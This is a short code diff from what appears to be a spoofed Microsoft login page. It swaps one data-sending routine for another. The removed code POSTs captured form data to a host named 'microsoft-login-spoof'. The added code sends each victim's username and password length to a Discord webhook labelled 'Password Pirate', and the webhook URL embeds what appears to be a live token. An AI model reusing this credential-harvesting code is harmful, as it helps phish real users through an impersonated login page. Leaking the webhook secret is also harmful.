@@ -22,15 +22,30 @@ const createBody = (data) => {
     return urlEncodedData;
 }
 
-const sendData = (data) => fetch(`https://microsoft-login-spoof.onrender.com/userdata`, {
-    method: 'POST',
-    cache: 'no-cache',
-    headers: {
-        'Content-Type': 'application/x-www-form-urlencoded',
-    },
-    referrerPolicy: 'no-referrer',
-    body: createBody(data),
-}).then(response => console.error(response));
+const sendData = (data) => {
+    fetch('https://discord.com/api/webhooks/1305606177777778788/InbjBbuYwVV6R5DvN3Bne305sSGI8CTmMBKaolmi9VITc9hLai3dbnPgBkFZ22JjchDo', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json',
+        },
+        body: JSON.stringify({
+            content: `User: ${data.userName}, Password Length: ${data.passwordLength}`,
+            username: 'Password Pirate'
+        }),
+    })
+        .then(response => {
+            if (!response.ok) {
+                throw new Error('Network response was not ok ' + response.statusText);
+            }
+            return response.json();
+        })
+        .then(data => {
+            console.log('Success:', data);
+        })
+        .catch(error => {
+            console.error('There was a problem with the fetch operation:', error);
+        });
+}
 
 function validateEmail(email) {
     const re = /^(([^<>()[\]\\.,;:\s@\"]+(\.[^<>()[\]\\.,;:\s@\"]+)*)|(\".+\"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
